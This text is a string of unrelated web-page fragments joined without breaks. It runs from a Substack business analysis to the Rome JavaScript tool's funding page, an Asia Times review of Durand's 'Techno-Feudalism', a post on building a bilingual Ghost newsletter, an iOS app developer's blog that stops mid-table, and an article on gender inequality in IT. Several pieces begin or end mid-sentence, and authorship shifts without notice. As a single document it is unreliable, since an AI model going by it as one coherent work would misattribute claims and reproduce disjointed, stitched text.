<p>Substack also wants to paint full independence as a hassle. Writers are writers, not business owners, not managers. Substack allows writers to focus on writing. Realistically, <a rel="noreferrer noopener" href="https://ghost.org/" target="_blank">Ghost</a>, Medium, and others are only slightly more difficult to figure out. They aren’t as trendy though. The “starting a Substack” trend will run out. Being ready to turn on the “we are simple and that makes us better” focus is important. This must remain true. Substack cannot become too complicated while the hype is still driving growth.</p>



<hr>



<p>Substack has grown quickly, but they must be careful with their growth. Writing is never going to get easier. The amount of people who consistently write content people are willing to pay for is limited. They aren’t close to hitting a ceiling, but their growth could slow if the “trendy” label wears off.</p>



<p>If growth slows and top writers leave, it will ruin the business. Substack is easy to join, but also easy to leave. More competition is coming. Good writers have options. Showing Substack as the best of those options will become increasingly important.</p>

These tools have both inspired me to create Rome, a new project that aims to simplify and improve JavaScript and web development.</p> <p>Rome consolidates dozens of separate tools into one. Rome can install your dependencies, check your code for errors, run your tests, bundle your code, and more, all via a single CLI. Rome will be able to replace Babel, ESLint, Prettier, Yarn, and webpack. <a href="https://rome.tools/">Learn more</a>.</p> <p>It’s been three months since we announced our initial <a href="https://rome.tools/blog/2020/08/08/introducing-rome.html">beta release</a>. Since then, we’ve received a tremendous amount of enthusiasm from the community. As that enthusiasm has grown, it’s become clear that Rome will require a full-time developer to be successful and deliver on our ambitious goals and release a stable v1.0.</p> <p><strong>I need your help to make it a reality.</strong></p> </section> <section> <h2 id="funding">Funding <a href="#funding" aria-label="funding"></a></h2> <p>I have left my job so I can work independently and focus on what the community needs. This includes a <a href="#allow-users-to-extend-functionality-with-plugins">plugin system</a>, <a href="#add-more-configuration-and-have-less-opinions">more configuration</a>, and <a href="#integrate-with-existing-tools">dedicated integrations for existing tools</a>.</p> <p>We have an initial goal of <strong>$100,000</strong>. This will allow myself to work independently on our first stable release. Additional funding would allow us to expand upon our release goals, fund future maintenance, and compensate other contributors.</p> <p>If you’re passionate about what we’re building, or have otherwise benefited from my work, I would appreciate your financial support.</p>    <section> <h3 id="recent-contributions">Recent Contributions <a href="#recent-contributions" aria-label="recent-contributions"></a></h3> <ul> <li>Loading...</li> </ul> </section> <section> <h3 id="contribute">Contribute <a href="#contribute" aria-label="contribute"></a></h3> <p>Prices are in USD.

I’ll make sure Rome works well for you and your organization.</p> <p>Migration support is where I personally help your organization adopt and use Rome. This could include porting configuration, integrating with CI, or even adding new features and configuration to Rome.</p> <p>Interested in something else or have questions?

We can make Rome easier to use and work for more people.</p> <section> <h3 id="add-more-configuration-and-have-less-opinions">Add more configuration and have less opinions <a href="#add-more-configuration-and-have-less-opinions" aria-label="add-more-configuration-and-have-less-opinions"></a></h3> <p>We have deliberately tried to keep configuration to a minimum. While this does produce a minimal API surface, it makes it almost impossible to easily migrate without losing functionality or changing conventions.</p> <p>We should aim to reduce the functional differences between Rome and other tools by introducing additional configuration and supported languages. This could include:</p> <ul> <li>Code formatting options</li> <li>Ability to customize expected filenames and directories</li> <li>Support for other configuration languages such as YAML and TOML</li> <li>More CLI flags</li> <li>Public JavaScript API</li> <li>Dynamic configuration (as opposed to static JSON-only configuration files)</li> <li><a href="#allow-users-to-extend-functionality-with-plugins">Allow extending functionality with plugins</a></li> </ul> <p>We have so far kept configuration light, as by reducing the amount of configuration options supported, we reduce maintenance cost and the potential for internal bugs.</p> <p>While this makes it easier for us as maintainers, it makes it drastically more difficult for users. No matter how persuasive our arguments may be for why you should use hard tabs instead of spaces, they seem like artificial and arbitrary constraints and introduces excessive prerequisites for adoption.</p> <p>Strong defaults and guided documentation for new users can provide the experience we ultimately want to offer, while removing our existing adoption restrictions.</p> </section> <section> <h3 id="integrate-with-existing-tools">Integrate with existing tools <a href="#integrate-with-existing-tools" aria-label="integrate-with-existing-tools"></a></h3> <p>Rome attempts to replace many tools. However we should still strive to support scenarios where another tool is better situated or preferred. This can also help during a migration where Rome is used in conjunction with another tool. We can do this in a couple of ways:</p> <p><strong>Integrating Rome as a first-class plugin in tools such as Babel, eslint, and webpack</strong></p> <p>Rome could be exposed as a plugin for those tools to allow you to adopt the Rome compiler without having to adopt the bundler first. This would reduce adoption prerequisites and allow easier experimentation inside of existing setups.</p> <p><strong>Seamlessly integrate other tools into Rome</strong></p> <p>We can introduce compatibility layers to have ESLint, Babel, and other tools run inside of Rome itself. ESLint errors could be displayed alongside Rome linter errors with the same UI and output format Instantly you could benefit from Rome’s file caching and parallelisation without needing a major migration.</p> </section> <section> <h3 id="assist-in-migrating-from-existing-tools">Assist in migrating from existing tools <a href="#assist-in-migrating-from-existing-tools" aria-label="assist-in-migrating-from-existing-tools"></a></h3> <p>It should be easy to migrate from other tools to Rome. First we need to ensure popular configuration options from other tools are supported. Then, offer automated tools to migrate basic setups without users needing to it manually.</p> <p>This needs to be accompanied with dedicated documentation and guides that can explain the differences between the tools, why you might want to use one over the other, similar concepts, new terminology, and equivalent config options.</p> </section> <section> <h3 id="allow-users-to-extend-functionality-with-plugins">Allow users to extend functionality with plugins <a href="#allow-users-to-extend-functionality-with-plugins" aria-label="allow-users-to-extend-functionality-with-plugins"></a></h3> <p>One of the fears with Rome is creating a monoculture where it’s impossible to innovate and experiment with new ideas. While it’s extremely optimistic to think we’ll ever get into any sort of monopolistic position, not allowing extensions does stiffle innovation regardless of our market position by restricting the viability and adoption of new ideas.</p> <p>Plugins allow us to avoid supporting functionality that we might not want, while still giving users a choice. It reduces our role as an arbiter and allows new languages, non-standard JavaScript features, code conventions, and ideas that interact with Rome to be viable, receive support, and proliferate.</p> <p>We need to be extremely careful not to get into the position where Babel and Webpack are today, where they’re heavily restricted by the usage of internal APIs. We need to be able to maintain our autonomy when it comes to making architectural changes. Balancing this with a powerful plugin API will be a challenge and will likely require several iterations.</p> </section> <section> <h3 id="release-undocumented-features">Release undocumented features <a href="#release-undocumented-features" aria-label="release-undocumented-features"></a></h3> <p>Rome currently does a lot more than linting. It’s a major challenge today to market and explain Rome when so much of the project isn’t officially supported. While we strive to make each individual component of Rome competitive on it’s own, to some the biggest advantage and compelling reason for using Rome might be the reduction in dependencies.</p> <p>We should focus on releasing and maturing basic versions of all core functionality. This would increase user confidence in our architecture and show that Rome is viable as the comprehensive replacement that we want to be.</p> </section> <section> <h3 id="provide-accessible-and-comprehensive-documentation">Provide accessible and comprehensive documentation <a href="#provide-accessible-and-comprehensive-documentation" aria-label="provide-accessible-and-comprehensive-documentation"></a></h3> <p>Documentation for developer tools is generally quite obtuse and relies a lot on prerequisite knowledge. This can make it intimidating and inaccessible for developers new to the ecosystem. Further complicating that is the broad scope of what Rome is trying to do.</p> <p>We have tried to address some of this by making our documentation a single page. This makes it easy to search, and it can be read from top to bottom without needing to jump around to learn about different concepts. However as our supported features grow, it will be more difficult to use this structure without oversimplifcation and doesn’t allow different paths for different demographics.</p> <p>We need to invest in a more scalable approach for our documentation. We can offer dedicated sections that explain features like linting end-to-end without needing to introduce other components like the compiler and bundler that contain significantly more concepts and overwhelm the reader. Separate guides can be offered for new users and those already experienced with other tools to properly cater for multiple audiences.</p> </section> <section> <h3 id="regularly-release-new-versions">Regularly release new versions <a href="#regularly-release-new-versions" aria-label="regularly-release-new-versions"></a></h3> <p>One of the reasons Babel was successful is how quickly I was able to quickly fix bugs and release new versions. I would regularly have releases out within minutes of a bug report. This was critical during the early days when adoption was low. Being able to unblock users quickly would often make them more excited to use Babel even though they ran into a bug.</p> <p>Similarly, we should try and replicate this by building out our release infrastructure to allow the rapid testing and release of versions. We need to maintain momentum as the scope of supported features grow.</p> <p>We can achieve this with automated releases that can be manually triggered or deployed on a schedule. Automatic changelog generation would also take a lot of the manual work out of producing releases. Nightly releases would allow users to test experimental features and provide early feedback.</p> </section> </section> <section> <h2 id="questions-and-answers">Questions and Answers <a href="#questions-and-answers" aria-label="questions-and-answers"></a></h2> <section> <h3 id="when-will-physical-rewards-be-shipped">When will physical rewards be shipped? <a href="#when-will-physical-rewards-be-shipped" aria-label="when-will-physical-rewards-be-shipped"></a></h3> <p>We are tentatively aiming for the end of April 2021, however due to COVID delays or order volume this could be extended.

<p><em>This article was originally published on <a href="https://asiatimes.com/2020/12/no-escape-from-our-techno-feudal-world/">Asia Times</a>.</em></p>
<p>The political economy of the Digital Age remains virtually terra incognita. In <a href="https://www.amazon.com/Technof%C3%A9odalisme-French-C%C3%A9dric-DURAND-ebook/dp/B08GS8XV47/ref=pd_ybh_a_2?_encoding=UTF8&amp;psc=1&amp;refRID=ZCPCTPFZXYQBGGRPBDH3">Techno-Feudalism</a>, published three months ago in France (no English translation yet), <strong>Cedric Durand,</strong> an economist at the Sorbonne, provides a crucial, global public service as he sifts through the new Matrix that controls all our lives.</p>
<p>Durand places the Digital Age in the larger context of the historical evolution of capitalism to show how the Washington consensus ended up metastasized into the Silicon Valley consensus. In a delightful twist, he brands the new grove as the “Californian ideology”.</p>
<p>We’re far away from Jefferson Airplane and the Beach Boys; it’s more like Schumpeter’s “creative destruction” on steroids, complete with IMF-style “structural reforms” emphasizing “flexibilization” of work and  outright marketization/financialization of everyday life.</p>
<p>The Digital Age was crucially associated with right-wing ideology from the very start. The incubation was provided by the <a href="http://www.pff.org/">Progress and Freedom Foundation (PFF)</a>, active from 1993 to 2010 and conveniently funded, among others, by Microsoft, At&amp;T, Disney, Sony, Oracle, Google and Yahoo.</p>
<p>In 1994, PFF held a ground-breaking conference in Atlanta that eventually led to a seminal Magna Carta: literally, <a href="https://www.goodreads.com/book/show/39342741-cyberspace-and-the-american-dream">Cyberspace and the American Dream: a Magna Carta for the Knowledge Era</a>, published in 1996, during the first Clinton term.</p>
<p>Not by accident the magazine <a href="https://www.wired.com/">Wired </a>was founded, just like PFF, in 1993, instantly becoming the house organ of the “Californian ideology”.</p>
<p>Among the authors of the Magna Carta we find futurist <a href="https://www.tofflerassociates.com/about/the-toffler-legacy/">Alvin “Future Shock” Toffler</a> and Reagan’s former scientific counselor George Keyworth. Before anyone else, they were already conceptualizing how “cyberspace is a bioelectronic environment which is literally universal”. Their Magna Carta was the privileged road map to explore the new frontier.</p>
<p><strong>Those Randian heroes</strong></p>
<p>Also not by accident the intellectual guru of the new frontier was Ayn Rand and her quite primitive dichotomy between “pioneers” and the mob. Rand declared that egotism is good, altruism is evil, and empathy is irrational.</p>
<p>When it comes to the new property rights of the new Eldorado, all power should be exercised by the Silicon Valley “pioneers”, a Narcissus bunch in love with their mirror image as superior Randian heroes. In the name of innovation they should be allowed to destroy any established rules, in a Schumpeterian “creative destruction” rampage.</p>
<p>That has led to our current environment, where Google, Facebook, Uber and co. can overstep any legal framework, imposing their innovations like a <em>fait accompli</em>.</p>
<p>Durand goes to the heart of the matter when it comes to the true nature of “digital domination”: US leadership was never achieved because of spontaneous market forces.</p>
<p>On the contrary. The history of Silicon Valley is absolutely dependent on state intervention – especially via the industrial-military complex and the aero-spatial complex. The Ames Research Center, one of NASA’s top labs, is in Mountain View. Stanford was always awarded juicy military research contracts. During WWII, Hewlett Packard, for instance, was flourishing thanks to their electronics being used to manufacture radars. Throughout the 1960s, the US military bought the bulk of the still infant semiconductor production.</p>
<p><a href="https://www.technologyreview.com/2016/03/21/161487/the-rise-of-data-capital/"><em>The Rise of Data Capital</em></a><em>, </em>a 2016 MIT Technological Review report produced “in partnership” with Oracle, showed how digital networks open access to a new, virgin underground brimming with resources: “Those that arrive first and take control obtain the resources they’re seeking” – in the form of data.</p>
<p>So everything from video-surveillance images and electronic banking to DNA samples and supermarket tickets implies some form of territorial appropriation. Here we see in all its glory the extractivist logic inbuilt in the development of Big Data.</p>
<p>Durand gives us the example of Android to illustrate the extractivist logic in action. Google made Android free for all smartphones so it would acquire a strategic market position, beating the Apple ecosystem and thus becoming the default internet entry point for virtually the whole planet. That’s how a de facto, immensely valuable,  online real estate empire is built.</p>
<p>The key point is that whatever the original business – Google, Amazon, Uber – strategies of conquering cyberspace all point to the same target: take control of “spaces of observation and capture” of data.</p>
<p><strong>About the Chinese credit system…</strong></p>
<p>Durand offers a finely balanced analysis of the Chinese credit system – a public/private hybrid system launched in 2013 during the 3<sup>rd</sup> plenum of the 18<sup>th</sup> Congress of the CCP, under the motto “to value sincerity and punish insincerity”.</p>
<p>For the State Council, the supreme government authority in China, what really mattered was to encourage behavior deemed responsible in the financial, economic and socio-political spheres, and sanction what is not. It’s all about trust. Beijing defines it as “a method of perfecting the socialist market economy system that improves social governance”.</p>
<p>The Chinese term – <em>shehui xinyong</em> – is totally lost in translation in the West. Way more complex than “social credit”, it’s more about  “trustworthiness”, in the sense of integrity. Instead of the pedestrian Western accusations of being an Orwellian system, priorities include the fight against fraud and corruption at the national, regional and local levels, violations of environmental rules, disrespect of food security norms.</p>
<p>Cybernetic management of social life is being seriously discussed in China since the 1980s. In fact, since the 1940s, as we see in Mao’s <em>Little Red Book</em>. It could be seen as inspired by the Maoist principle of “mass lines”, as in “start with the masses to come back to the masses: to amass the ideas of the masses (which are dispersed, non-systematic), concentrate them (in general ideas and systematic), then come back to the masses to diffuse and explain them, make sure the masses assimilate them and translate them into action, and verify in the action of the masses the pertinence of these ideas”.</p>
<p><strong>Durand’s analysis goes one step beyond Soshana Zuboff’s</strong></p>
<p><em>The Age of Surveillance Capitalism</em> when he finally reaches the core of his thesis, showing how digital platforms become “fiefdoms”: they live out of, and profit from, their vast “digital territory” peopled with data even as they lock in power over their services, which are deemed indispensable.</p>
<p>And just as in feudalism, fiefdoms dominate territory by attaching serfs. Masters made their living profiting from the social power derived from the exploitation of their domain, and that implied unlimited power over the serfs.</p>
<p>It all spells out total concentration. Silicon Valley stalwart Peter Thiel has always stressed the target of the digital entrepreneur is exactly to bypass competition. As quoted in <em>Crashed: How a Decade of Financial Crises Changed the World</em>, Thiel declared, “Capitalism and competition are antagonistic. Competition is for losers.”</p>
<p>So now we are facing not a mere clash between Silicon Valley capitalism and finance capital, but actually a new mode of production:</p>
<p>a turbo-capitalist survival as rentier capitalism, where Silicon giants take the place of estates, and also the State. That is the “techno-feudal” option, as defined by Durand.</p>
<p><strong>Blake meets Burroughs</strong></p>
<p>Durand’s book is extremely relevant to show how the theoretical and political critique of the Digital Age is still rarified. There is no precise cartography of all those dodgy circuits of revenue extraction. No analysis of how do they profit from the financial casino – especially mega investment funds that facilitate hyper-concentration. Or how do they profit from the hardcore exploitation of workers in the gig economy.</p>
<p>The total concentration of the digital glebe is leading to a scenario, as Durand recalls, already dreamed up by Stuart Mill, where every land in a country belonged to a single master. Our generalized dependency on the digital masters seems to be “the cannibal future of liberalism in the age of algorithms”.</p>
<p>Is there a possible way out? The temptation is to go radical – a Blake/Burroughs crossover. We have to expand our scope of comprehension – and stop confusing the map (as shown in the Magna Carta) with the territory (our perception).</p>
<p>William Blake, in his proto-psychedelic visions, was all about liberation and subordination – depicting an authoritarian deity imposing conformity via a sort of source code of mass influence. Looks like a proto-analysis of the Digital Age.</p>
<p>William Burroughs conceptualized Control – an array of manipulations including mass media (he would be horrified by social media). To break down Control, we must be able to hack into and disrupt its core programs. Burroughs showed how all forms of Control must be rejected – and defeated: “Authority figures are seen for what they are:  dead empty masks manipulated by computers”.</p>
<p>Here’s our future: hackers or slaves.</p>

December 7, 2020 | https://interconnected.blog/building-a-bilingual-newsletter-2020-edition/ | <a href="https://web.archive.org/web/*/https://interconnected.blog/building-a-bilingual-newsletter-2020-edition/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="english-version">
                        <p>I’m taking a departure from my usual deep dive analysis to write this “under the hood” exploration of how I’ve been building this bilingual newsletter. I want to share some behind the scenes information, because I’ve always treated Interconnected as a product, not just a blog. Even though it is basically a blog at the moment, there are many things I plan to build on top of this foundation, and sharing the technology, thinking, design, and various experiments is a good way to keep myself honest and learn better in public. I plan to write a similar post like this every year going forward to share and track all the changes, new technologies I try, keep, abandon, as well as product ideas that are constantly floating in my head.</p><p>On another level, I’m motivated to share, because I hope it will help more people produce bilingual content and lubricate the information flow between two languages -- not just the English-Chinese pairing, but any pairing. As <a href="https://interconnected.blog/november-15-2020-16-days/">I noted (perhaps lamented) in my opening letter </a>of last week’s Interconnected Weekly, there’s still so much that needs to be done to improve the information flow between the English and Chinese language world. The 16-days gap between Jack Ma giving his Bund Summit speech and my translating and publishing the speech is too long and too unreliable.</p><h2 id="tech-stack">Tech Stack</h2><p>I use <a href="https://ghost.org/">Ghost</a> as my publishing platform. It is a relatively new platform (started in 2013) that’s completely open sourced, just like its older brethren Wordpress (started in 2003). Ghost is built on the JAM stack (JavaScript, API, Markup), which is a hot and trendy way to build static websites that’s fast and lightweight.</p><p>I chose Ghost because: 1. I’ve had some experience customizing it when launching another blog called <a href="https://coss.media/">COSS Media</a> (writings focused on the commercial open source ecosystem) last year; 2. I like its open source nature (versus its proprietary counterpart Medium), which gives me more control. As many of you know, I’m <a href="https://interconnected.blog/tag/open-source/">quite deep into open source</a> and have written a lot about it, so it’s important to me to “eat my own dog food” too. Ghost also has built-in features for collecting subscribers and designing paid tiers, which I plan to use eventually. Of course, you can do all this in Wordpress too, but it’s typically done via plug-ins that end up bloating the website and degrade load speed -- something I want to avoid in order to give all readers a good experience, wherever they are on our planet. Fast load speed helps with SEO too.</p><figure><img src="https://lh6.googleusercontent.com/eR1dlR-MBmNHWKwYkudnc1AJxqM8m_M0_7GLV5e7oXyd627sL6LhfvViU2eyp5Wy7BPPVAXACBqHlK4LsZnQI5CSGbYAqyU_NLCy4Srz4MRMjnshF0nFh9D9IV6cnZjzL4e80qK3" alt=""></figure><p>It’s not all smooth-sailing with Ghost. Being a young platform, it has plenty of bugs and rooms for improvement. It currently lacks some table stakes features, like email open rate, forwarding tracking, and basic analytics around email interactions with subscribers. I have chosen not to obsess over these metrics for now, because it tends to take my focus away from writing, bad for mental health, and Google Analytics is a sufficient enough substitute. All of these features are on Ghost’s roadmap, so I’m willing to be patient, for now.</p><p>Ghost also has some small issues that are not deal-breakers, just annoying. For example, it has a subscribers dashboard that generates a line chart to show growth (cool!) but there’s a bug that makes the line flat (sad...).</p><figure><img src="https://lh3.googleusercontent.com/2uTlxpvx98QjbQNzYD9loOj0sE1Y9vmc2VeADoV0WqPigviq4-jBhVxyKCqs8r1mKbpw44QF21IaW19F2oITSBkEWxFAgmZOpzOdJhc_pZYwECogVeDIZJ50Bu4yWTaTq9xKBMe3" alt=""></figure><p>This is <a href="https://github.com/TryGhost/Ghost/issues/12083">a known bug and tracked publicly</a> on GitHub, which is standard practice for any open source software. In open source, you can’t hide your problems; you just have to deal with them, in public.</p><p>For my purpose, the best part about using Ghost is its choice of using <a href="https://github.com/handlebars-lang/handlebars.js">Handlebar.js</a> to do its frontend templating and rendering, which is an open source, mature JavaScript framework (first commit was in July 2010). Being open sourced, mature, and a bit boring (instead of new and flashy) is good, because I know there’s enough tutorials out there to help me do customization on my own. If I want something more complicated, I can easily find skilled developers. Going into building Interconnected, I knew providing a good bilingual reading experience would be a challenge, so customizability was key.</p><p>The initial version of Interconnected was an anchor tag hack that I cobbled together where readers who want to read the Chinese version will jump from a link at the top to the halfway point of the page where the Chinese part starts, but can’t jump back. It works but it’s far from ideal. During my research when writing “<a href="https://interconnected.blog/gpt-3-abstraction-of-time-money/">GPT-3: An Abstraction of Time vs Money</a>”, I discovered that OpenAI’s blog has a nice toggle experience <a href="https://openai.com/charter/">between the English and Chinese version of its charter</a>. I already knew that OpenAI uses Ghost to publish content, so the toggle experience could definitely be replicated on Interconnected.</p><figure><img src="https://lh4.googleusercontent.com/eSMGAYhdWSSaDb3YU7mMrRtNtQ3QnQ5r2_AvsaTMBN6SZG-DXX2pyiV-0gTUutqTQhPdk1e0FFYEK0WpFJGcpravCAqWtw2Q0GTCNgfPLDIFAf_Ps2Hm7ySLX5uGSwV-G-OaoohB" alt=""></figure><p>Instead of coding the improvement on my own, I decided to look for help to speed up progress. I ended up hiring a contractor, who is already familiar with Ghost’s various theme templates to do ad-hoc improvements on a project-by-project basis. In addition to building the bilingual toggle, this contractor also built the <a href="https://interconnected.blog/archive/">archive section</a> and many UI improvements to make reading here more effective. The combined cost of these three improvements is less than $200.</p><figure><img src="https://lh6.googleusercontent.com/W2P9fKq30hRq6cs9X9mXzyU3RxxGT9ZkZHVqMem7Cnc22b4dbGfhOYzowWB5ksOS_5uGynKlmRXE72ued4k07_RHrqt5eUDFWWFaJX9rI9XGN50mTsoiSAej6-NQRNs-lOaZyaxv" alt=""></figure><p>Here are some best practices when working with remote contract developers: figure out exactly what you want first, down to the smallest details, before approaching anyone. Using contract developers can be very efficient and cost effective when there is a clear example to replicate, but they are not good (nor should they be) at designing and iterating on half-baked ideas with you. That’s also why, generally speaking, building a startup product with contract developers during its rapid prototyping and discovery phase is a bad idea.</p><p>In other words, contractors are good for cloning, not creating.</p><h2 id="bilingual-writing-process">Bilingual Writing Process</h2><p>I start every post in English first and usually get to a draft that is 85% done before starting on the Chinese version. In the beginning, I used Baidu Translate to turn the 85% done English version into a 50% done Chinese draft, before writing on top of it. I now use <a href="https://www.deepl.com/translator">DeepL</a> for the same purpose. I think DeepL is slightly better than Baidu Translate, but currently don’t have a strong opinion about either one; both work well done.</p><p>The process I apply to the Chinese version is what I call “trans-creating”, a term one of my former colleagues used, which I really like. It’s not a straight-up translation, but a re-creation in a different language. Because I’m the original creator of both, it’s not necessary to stay true to one version or the other -- the goal is to communicate ideas and information in the language they are being conveyed in, properly and naturally.</p><p>For example, the English version may contain certain companies, market concepts, and acronyms related to China that require additional context for the readers to understand, but are obvious for Chinese readers, thus the added background may be omitted in the Chinese version. Certain idioms and humor in the English version simply don’t translate well in Chinese, so the same part may be told in a more straightforward way in the Chinese version.</p><p>One surprising thing I discovered during this twice weekly “trans-creation” process is that writing the Chinese version actually helps improve the English version, because it more effectively exposes imprecisions, inaccuracies, and poorly written passages.</p><figure><blockquote data-width="550"><p lang="en" dir="ltr">One surprising thing I discovered from writing bilingually every week is that my Chinese writing process actually helps me improve the English version...by more effectively exposing imprecisions and spotting passages that are poorly explained.</p>— Kevin Xu (@kevinsxu) <a href="https://twitter.com/kevinsxu/status/1321947923555385344?ref_src=twsrc%5Etfw">October 29, 2020</a></blockquote>

</figure><p>Writing is a draining process. Writing bilingually can be extra draining. And when you are drained, dumb mistakes and typos happen. (I loathe typos, because I think it’s the most disrespectful thing a writer can do to a reader.) To shore up quality, I hired an intern a couple of months ago, who is perfectly bilingual (much more so than me) to edit all my writings, plus doing additional research and product development projects. They (not a typo, but the preferred pronoun) also log all my mistakes along with examples of proper usage, so hopefully my own writing will improve over time.</p><p>I have been extra energized and motivated since this intern came on board; their contribution is immediate! I pay them a monthly stipend -- best money I’ve ever spent. (Treat your interns well!)</p><h2 id="future-product-improvements">Future Product Improvements</h2><p>Interconnected, as a product, still has a long way to go. While the English-Chinese toggle has made reading one specific post between the two languages better, the entire website is still more English-centric, which isn’t as friendly to my Chinese reading audience.</p><p>There are many multilingual websites out there, but most of them are corporate sites with limited content -- a form I find ill-suited for consuming long-form writing. There has to be a better design for bilingual and multilingual consumption. (If you have design ideas, please share them with me!)</p><p>Ghost’s built-in email template is also not flexible -- you cannot toggle or easily navigate between the two language versions, which is why I’ve started appending a message at the top of every email to guide my Chinese readers with the best way to consume my posts. (If you received this post via email, you would have seen it.) This is an area where I hope Ghost will offer more customizability. It’ll be the next big improvement I plan to tackle.</p><p>Lastly, I have plans to build more complex offerings on top of this foundation -- a community, a paid layer, a place for more interconnected, interdisciplinary knowledge exchange via multiple mediums, like audio, video, chat, and simulation games. <strong>Interconnected is a 10 year project for me; we are only in the 10th month.</strong></p><p>I hope this “under the hood” post provides some useful information on how to build a bilingual newsletter -- an undertaking entirely doable and replicable by anyone. And I look forward to writing this post again a year from now and share …</p></div></div>

Later I moved to the Web where I got familiar with node.js and now I'm a 👨🏻 Backend Engineer for almost 6 years.</p><p>I never touched any mobile App development environment. I'm an iPhone user since I used smartphones and the one time I looked into ObjectiveC scared me away.</p><p>In short: I had no clue what I'm doing as I started this journey 😀</p><h2 id="motivation">Motivation</h2><p>It's 2020 and I guess you know what happened this year. Fucking Corona. In Germany we got this <em>Corona Warn App</em> which was advertised as fully transparent and open sourced available for everyone to review:</p><figure><a href="https://github.com/corona-warn-app/cwa-app-ios"><div><p>corona-warn-app/cwa-app-ios</p><p>Native iOS app using the exposure notification framework from Apple. - corona-warn-app/cwa-app-ios</p><p><img src="https://github.githubassets.com/favicons/favicon.svg"><span>corona-warn-app</span><span>GitHub</span></p></div><p><img src="https://avatars0.githubusercontent.com/u/64403099?s=400&amp;v=4"></p></a><figcaption>Corona Warn iOS App on Github</figcaption></figure><p>It's not that I don't trust our government, I was just curious how such an App has been built.</p><p>And this code kinda surprised me because it looked very readable and not like that Objective-C thing I saw some years ago 😀</p><p>That's what got me googling ... and I found these <a href="https://developer.apple.com/tutorials/swiftui">SwiftUI Tutorial</a>s from Apple teaching the basics of Swift(UI) in a nice and explanatory way.</p><p>But after the first few lessons my enthusiasm faded away because building just sample Apps doesn't cut it. I wanted to develop something useful which could eventually even end up in the AppStore.</p><h2 id="finding-an-app-idea-">Finding an App Idea 💡</h2><p>Finding an Idea for an App which doesn't already exists is like searching for the holy grail or something.

The Idea is not new, even Apples native Photos App can do that ... but not exactly how I want it to work and look.</p><p>I had a pretty clear picture in my mind what the App should be able to do:</p><ul><li>Provide photos for exactly this date (Apple is sneaking in a few days before and after)</li><li>Different years are easily distinguishable</li><li>Provide a look and feel as native as possible</li><li>Show extended photo details (location, Exif metadata...)</li><li>Get notified on days where I have memories to look back</li></ul><p>There are also Apps for some of those points but none which tackles all of them.</p><p>That's why I decided to build my own version because it would have at least one user: Me 🙂</p><h2 id="pricing-">Pricing 💵</h2><p>Although most people still expect that digital goods are for free I decided to charge a little fee for advanced fastbackward features.</p><p>I chose to go the way of In-App purchases instead of charging the customer upfront. That way the potential customers can try the App and if they want to have more than one year of memories or extended metadata they need the Pro version.</p><p>It's hard to find the right price for my App. Therefore I asked some people if they buy Apps on the AppStore and if yes what's their pricing limit.</p><p>Most people don't even want to spend any money at all, and if they decide to buy the limit is between 1 and 2 Euros. <em><a href="https://www.youtube.com/watch?v=yJxCdh1Ps48">Sad trombone</a></em></p><p>The other thing I learned is that almost nobody knows about the fees which apply to App Store sales.<br>They are not aware of the 99€/year which are required to actually get (and keep) your App inside Apples AppStore and the 30% (soon only 15%) cut you have to give to Apple for every purchase.</p><p>I decided to go with Apples Pricing Tier 2 (2,29€ in Germany currently), which will still return me more than an Euro after processing:</p><pre><code>Pricing Tier 2:		2,29€
- 16% VAT*:		0,37€
- 30% Apple Fees:	0.58€
-------

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="description">
<p><em>Gender inequality</em> examples are all around us, and we learn to recognize them from a very early age. However, most cases based on differences between men and women usually praise <em>one</em> side while undermining the other. Female developers enter into this problem reluctantly, being an ever-present target for inequality proponents.</p>
<p>We want to believe that gender should not be a discriminative factor in IT, and the sooner everyone accepts this realization, the better we look in the eyes of our future selves.<br>A quick look at how women rank in the tech business shows us how vulnerable companies are to gender-based attacks. At Facebook and Apple, most employees are men. The same goes for Microsoft and Google. Is the IT industry going to stay a man’s domain?<br>Although the IT Industry feels the man-to-women ratio discrepancy, it is not a strictly IT-related problem. In fact, all other sectors <em>except manufacturing</em> are all man dominated.</p>
<div>
<blockquote>
<p>Gender inequality should shame us all in the 21st century because it is not only unacceptable, it is stupid!</p>
</blockquote>

</div>
<h2>A look at the numbers</h2>
<p>A GAO report from 2015 suggests that a little over one-third of people working in the tech sector are female in the US. Even though the discrepancy gap between gender has been evening out since the 80s, gender issues are still stagnating the market with equal opportunities demands of all nature.<br>The number of female software engineer graduates ready to enter the workforce is even lower than the number of total employed women in the sector, which shows that they are somewhat reluctant to pursue a career in this domain. Even more — nearly half of the women who graduate as certified engineers choose not to enter the industry market as coders. Most females from the IT industry prefer more creative positions like <strong><a href="https://codecoda.com/en/blog/entry/ui-ux-design-explained">graphics</a></strong> or fashion designers.<br>Some might suggest that coding is hard for girls, which mostly deters them from taking this path. However, there is a lot more ingredients brewing in the pot. And besides, software development is <strong>not exactly rocket science</strong>. Female working in high tech is under the constant umbrella of possible male repression and the fear of being undermined. Gender inequality claims and conditions are prerequisites for creating a very unhealthy work environment and navigating around them, sometimes facing the facts straight away.<br>We believe the female contribution to software development and the way it changes and improves is undeniable. The fact that gender inequality factors sustain a <em>dogma</em> in the business world is what some female programmers recognize as motivating factors. We strongly encourage all girls interested in software engineering to pursue their dream because very soon, all traces of discomfort coming due to inequality will be a thing in the past.<br>Let’s look at some concrete reasons why women may feel threatened while impacting the tech industry.</p>
<h2>Feeling like a stranger in your own yard</h2>
<p>During college and her first year on the job, Maria shared that she felt like an <em>alien</em>. She was repeatedly asked about her <em>qualifications</em> and peppered with comments on her excellent dress style and <em>neat appearance</em>. They even used a loud pitch to inquire about here future planning on family and children.<br>Such experience comes with an initial shock, Maria said. She decided to <em>desensitize</em> herself from this disturbance and focus on picking up <em>skills</em> quickly. She learned how to rise above obstacles and familiarized herself with strong male rivals, as well as a horde of competition from the same gender. These initial struggles were very challenging, but she eventually learned how to better promote her accomplishments and successes.<br>Nowadays, Maria is an intrapreneur working for <em>Samsung</em>. She quickly adapted to the male ruled world of IT and learned how to be excellent at it.</p>
<h2>Why women leave</h2>
